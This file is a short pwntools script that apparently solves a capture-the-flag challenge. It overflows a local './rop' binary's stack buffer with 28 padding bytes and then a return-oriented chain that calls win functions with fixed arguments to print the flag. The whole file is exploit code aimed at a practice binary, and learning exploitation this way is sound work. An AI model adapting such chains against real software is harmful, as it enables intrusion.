#!/usr/bin/env python

from pwn import *

r = process("./rop")
pause()
r.recvuntil("Enter your input> ")

payload = (
    "A" * 28 +
    p32(0x80485cb) +  # win_function1
    p32(0x80485d8) +  # win_function2
    p32(0x804862b) +  # flag
    p32(0xBAAAAAAD) + # arg for win_function2
    p32(0xDEADBAAD) # arg for flag
)

r.sendline(payload)
print(r.recvall())

